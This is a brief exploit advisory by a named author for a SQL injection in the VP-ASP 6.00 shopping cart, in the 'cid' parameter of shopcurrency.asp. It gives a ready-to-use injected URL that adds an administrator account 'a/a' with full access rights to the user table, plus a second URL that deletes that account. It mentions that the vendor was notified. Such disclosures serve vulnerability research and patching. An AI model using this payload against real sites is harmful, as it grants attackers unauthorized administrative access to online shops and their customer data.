VP-ASP 6.00 SQL Injection / Exploit by tracewar(tracewar@gmail.com)

people claimed there is some underground sploit for vp-asp 6.00 and I was sure that
if a sploit really exist in the ug i can find the bug and make a small hack for it ^^
well it didn't take me more then 5 minutes to find a bug in vp-asp.

* the vendor was already notified.

The SQL Injection bug is in the shopcurrency.asp file under the "cid" query.

quick hack to add user a/a:

/shopcurrency.asp?cid=AUD';insert into tbluser ("fldusername","fldpassword","fldaccess") values ('a','a','1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29')--

and for those of you that don't know sql at all
this is how you remove the user 'a':

/shopcurrency.asp?cid=AUD';delete from tbluser where fldusername='a'--
